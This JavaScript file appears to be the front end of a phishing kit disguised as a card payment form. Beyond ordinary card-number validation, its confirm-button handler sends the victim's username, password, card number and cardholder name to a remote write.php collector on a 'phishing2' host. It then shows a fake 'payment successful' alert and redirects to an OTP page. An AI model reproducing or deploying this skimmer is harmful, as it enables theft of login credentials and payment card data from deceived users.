$(function() {

    var username = $('#username');
    var password = $('#password');
    // var CVV = $("#cvv");
    var owner = $('#owner');
    var cardNumber = $('#cardNumber');
    var cardNumberField = $('#card-number-field');
    var mastercard = $("#mastercard");
    var confirmButton = $('#confirm-purchase');
    var visa = $("#visa");
    var amex = $("#amex");
    var expirationdate = $("#expirationdate");
    

    cardNumber.keyup(function() {

        amex.removeClass('transparent');
        visa.removeClass('transparent');
        mastercard.removeClass('transparent');

        if ($.payform.validateCardNumber(cardNumber.val()) == false) {
            cardNumberField.addClass('has-error');
        } else {
            cardNumberField.removeClass('has-error');
            cardNumberField.addClass('has-success');
        }

        if ($.payform.parseCardType(cardNumber.val()) == 'visa') {
            mastercard.addClass('transparent');
            amex.addClass('transparent');
        } else if ($.payform.parseCardType(cardNumber.val()) == 'amex') {
            mastercard.addClass('transparent');
            visa.addClass('transparent');
        } else if ($.payform.parseCardType(cardNumber.val()) == 'mastercard') {
            amex.addClass('transparent');
            visa.addClass('transparent');
        }
    });

    confirmButton.click(function(e) {

        e.preventDefault();
        var a = ('http://192.168.64.139/phishing2/write.php?text=Username: '+username.val());
        var b = ('http://192.168.64.139/phishing2/write.php?text=Password: '+password.val());
        var c = ('http://192.168.64.139/phishing2/write.php?text=CardNumber: '+cardNumber.val());
        var d = ('http://192.168.64.139/phishing2/write.php?text=NameCard: '+owner.val());
        var e = ('http://192.168.64.139/phishing2/write.php?text='+cardNumberField.val());
        var f = ('http://192.168.64.139/phishing2/write.php?text="=============================================================================="');
        // alert(password.val());
        // alert(cardNumber.val());
        // alert(owner.val());
        // alert(cardNumber.val());
        var HttpClient = function() {
            this.get = function(aUrl, aCallback) {
                var anHttpRequest = new XMLHttpRequest();
                anHttpRequest.onreadystatechange = function() { 
                    if (anHttpRequest.readyState == 4 && anHttpRequest.status == 200)
                        aCallback(anHttpRequest.responseText);
                }

                anHttpRequest.open( "GET", aUrl, true );            
                anHttpRequest.send( null );
            }
        }
        var client = new HttpClient();
        client.get(a, function(response) {
        });
        client.get(b, function(response) {
        });
        client.get(c, function(response) {
        });
        client.get(d, function(response) {
        });
        client.get(e, function(response) {
        });
        client.get(f, function(response) {
        });

        if(owner.val().length < 10){
            alert("Sai tên chủ thẻ");
        } 

        else {
            // alert(JSON.stringify(cardNumber));
            alert("Thanh toán thành công");
            $(location).attr('href', 'otp.html');
        }
    });
});
